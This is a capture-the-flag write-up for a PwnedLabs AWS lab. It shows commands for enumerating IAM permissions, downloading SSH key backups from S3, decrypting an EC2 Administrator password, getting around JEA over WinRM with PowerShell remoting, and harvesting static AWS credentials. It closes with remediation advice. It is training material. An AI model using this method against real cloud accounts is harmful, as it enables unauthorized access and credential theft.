## Disclosure
This documentation is intended for educational purposes only. All activities were performed within a controlled, authorized environment provided by [PwnedLabs](https://pwnedlabs.io/). This write-up focuses strictly on the methodology, vulnerability analysis, and security remediation techniques. All sensitive identifiers, including credentials, tokens, and specific PII, have been redacted or generalized to comply with security best practices and the platform's Terms of Service. The intent of this content is to foster professional development and contribute to the cybersecurity community's knowledge base.

**The lab:** https://pwnedlabs.io/labs/leverage-insecure-storage-and-backups-for-profit

---
## Vulnerability Summary
The environment is vulnerable to **Privilege Escalation** and **Data Exfiltration** resulting from the exposure of infrastructure backups and weak IAM access 
control configurations.

1. **Information Disclosure**: The IAM user possessed permissions to list S3 bucket 
   policies, which revealed sensitive paths containing `ssh_keys_backup.zip`.
2. **Backdoor Access**: Retrieval of these keys, combined with `ec2:GetPasswordData` 
   permissions, allowed the attacker to decrypt the Windows Administrator password for 
   a target EC2 instance.
3. **Lateral Movement**: Upon accessing the instance, the attacker bypassed `Just Enough 
   Administration` (JEA) restrictions by establishing a full `PowerShell Remoting` 
   session, demonstrating a common path for post-exploitation escalation.
4. **Credential Harvesting**: The attacker discovered static AWS credentials stored 
   in the instance's local filesystem (`C:\Users\admin\.aws\credentials`). These 
   highly-privileged credentials provided administrative access to the entire 
   AWS account, leading to full compromise of sensitive data.

---
## Walkthrough
```bash
aws configure --profile stor
aws sts get-caller-identity --profile stor
	contractor
```

Enumerate user `contractor`:

```bash
aws iam list-attached-user-policies --user-name contractor --profile stor
	arn:aws:iam::427648302155:policy/Policy
aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/Policy --profile stor
	v4
aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/Policy --version-id v4 --profile stor
	ec2:DescribeInstances
	ec2:GetPasswordData
	bucket == hl-it-admin
```

This gives us permission to:
- Get password data from the EC2 instance `i-04cc1c2c7ec1af1b5`
- List and get information about all EC2 instances in the account
- Get information about the IAM policy attached to our current IAM user
- Get the S3 bucket policy for `hl-it-admin`

Let's check the bucket policy next:

```bash
aws s3api get-bucket-policy --bucket hl-it-admin --profile stor | jq -r '.Policy | fromjson'
	ssh_key_/ssh_keys_backup.zip
```

We find ssh key backups. Get them:

```bash
aws s3 cp s3://hl-it-admin/ssh_keys/ssh_keys_backup.zip . --profile stor
```

Now enumerate the EC2 instances:

```bash
aws ec2 describe-instances --filters Name=instance-state-name,Values=running --query 'Reservations[].Instances[].[Tags[?Key==`Name`].Value | [0],InstanceId,Platform,State.Name,PrivateIpAddress,PublicIpAddress,InstanceType,PublicDnsName,KeyName]' --profile stor | jq
	Backup
		isntance-id (e.g. 'i-53f2un0d3by52dyhn')
		it-admin
		IP

# OR

pacu
> set_keys
> run ec2__enum
> y
```

Enumerate the ports on the IP:

```bash
rustscan -a 54.226.75.125 --ulimit 5000
	5985
```

Using the `it-admin.pem` and the AWS creds from initial assumed breach, `get-password-data` for the instance id for Backup:

```bash
aws ec2 get-password-data --instance-id i-04cc1c2c7ec1af1b5 --priv-launch-key it-admin.pem --profile stor
```

Log into WinRM:

```bash
evil-winrm  -i 54.226.75.125 -u Administrator -p 'UZ$abRnO!bPj@KQk%BSEaB*IO%reJIX!'
```

This results in errors as the isntance environment is restricted with Just Enough Administration (JEA). To fix this, from ubuntu:

```bash
## Instructions for Ubuntu
# Update the list of packages
sudo apt-get update
# Install pre-requisite packages.
sudo apt-get install -y wget apt-transport-https software-properties-common
# Download the Microsoft repository GPG keys
wget -q "https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb"
# Register the Microsoft repository GPG keys
sudo dpkg -i packages-microsoft-prod.deb
# Delete the the Microsoft repository GPG keys file
rm packages-microsoft-prod.deb
# Update the list of packages after we added packages.microsoft.com
sudo apt-get update
# Install PowerShell
sudo apt-get install -y powershell
# Install PSWSMan module
pwsh -Command 'Install-Module -Name PSWSMan'
# Install NTLMSSP authentication mechanism
apt install gss-ntlmssp
```

After installing PowerShell and dependencies, create an object and establish a PS remoting session:
	This step may require troubleshooting to proceed with a WinRM/Powershell session.

```PowerShell
pwsh
$password = convertto-securestring -AsPlainText -Force -String '<PASSWORD>'
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "Administrator",$password
Install-Module -Name PSWSMan
Enter-PSSession -ComputerName 54.226.75.125 -Credential $credential

Enable-PSRemoting -SkipNetworkProfileCheck
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "54.226.75.125" -Concatenate
```

Enumerate `C:\Users\admin\.aws\credentials` for a set of AWS keys. Configure them and enumerate the bucket again:

```bash
aws configure --profile admin
aws sts get-caller-identity --profile admin
aws s3 ls hl-it-admin --profile admin
aws s3 cp s3://hl-it-admin/flag.txt . --profile admin
```

---

Extra:
Enumerate services with `aws-enumerator`:

```bash
aws-enumerator cred -aws_access_key_id <ACCESS_KEY> -aws_secret_access_key <SECRET_KEY> -aws_region us-east-1
aws-enumerator enum -services all
	DynamoDB
	EC2
aws-enumerator dump -services dynamodb
	DescribeInstances
aws-enumerator dump -services ec2
	DescribeEndpoints
```

---
## Remediations
1. **Secure Secret Management**:
   - Never store SSH keys, private certificates, or password-protected backups 
     in S3 buckets, regardless of access control settings.
   - Use `AWS Secrets Manager` to handle instance-related credentials and secrets.

2. **IAM Least Privilege**:
   - Restrict `ec2:GetPasswordData` to specific, non-production instances.
   - Audit IAM policies to ensure users do not have permissions to retrieve 
     bucket policies or ACLs for sensitive storage buckets.

3. **Instance Hardening**:
   - Prevent the storage of AWS credentials on EC2 instances. Use **IAM Instance 
     Profiles** to provide temporary, scoped permissions to applications instead of 
     static keys.
   - Enforce rigorous endpoint security. Ensure that `WinRM` and `PowerShell Remoting` 
     are restricted to secure, authorized administrative jump boxes.

4. **Monitoring & Governance**:
   - Implement **GuardDuty** to detect unusual API calls or anomalous login 
     attempts from instance-based credentials.
   - Use `AWS Systems Manager` to manage administrative tasks on EC2 instead of 
     opening ports for WinRM.
